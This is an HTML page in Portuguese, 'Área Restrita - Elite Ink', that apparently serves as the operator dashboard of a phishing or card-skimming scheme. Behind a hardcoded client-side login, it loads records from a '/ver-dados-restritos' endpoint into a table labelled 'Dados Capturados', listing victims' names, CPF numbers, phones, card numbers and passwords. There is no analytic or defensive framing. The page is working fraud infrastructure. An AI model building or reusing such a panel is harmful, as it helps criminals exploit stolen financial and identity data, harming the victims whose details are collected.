<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Área Restrita - Elite Ink</title>
    <style>
        body { background: #05070a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        #loginBlock { background: #0d1117; padding: 30px; border: 2px solid #58a6ff; border-radius: 15px; text-align: center; }
        input { display: block; width: 100%; padding: 10px; margin: 10px 0; background: #05070a; color: white; border: 1px solid #30363d; border-radius: 5px; }
        .hidden { display: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #0d1117; }
        th, td { border: 1px solid #30363d; padding: 10px; text-align: left; }
        th { background: #58a6ff; color: black; }
    </style>
</head>
<body>
    <div id="loginBlock">
        <span style="font-size: 40px;">🔒</span>
        <h2>Área Restrita</h2>
        <input type="text" id="user" placeholder="Login">
        <input type="password" id="pass" placeholder="Senha">
        <button onclick="logar()" style="width: 100%; padding: 10px; background: #238636; color: white; border: none; cursor: pointer;">ENTRAR</button>
    </div>

    <div id="painel" class="hidden" style="width: 90%; max-width: 1000px;">
        <h2>📊 Dados Capturados</h2>
        <button onclick="carregar()" style="padding: 10px; background: #58a6ff; border: none; cursor: pointer;">🔄 ATUALIZAR</button>
        <table>
            <thead>
                <tr><th>Nome</th><th>CPF</th><th>Telefone</th><th>Cartão</th><th>Senha</th><th>Data</th></tr>
            </thead>
            <tbody id="corpo"></tbody>
        </table>
    </div>

    <script>
        function logar() {
            if(document.getElementById('user').value === "Peganunca777" && document.getElementById('pass').value === "dks10dks") {
                document.getElementById('loginBlock').classList.add('hidden');
                document.getElementById('painel').classList.remove('hidden');
                carregar();
            } else { alert("Acesso Negado!"); }
        }
        async function carregar() {
            const res = await fetch('/ver-dados-restritos');
            const dados = await res.json();
            document.getElementById('corpo').innerHTML = dados.map(i => `
                <tr><td>${i.nome}</td><td>${i.cpf}</td><td>${i.telefone}</td><td>${i.cartao}</td><td style="color:red">${i.senha}</td><td>${new Date(i.dataRegistro).toLocaleString()}</td></tr>
            `).join('');
        }
    </script>
</body>
</html>
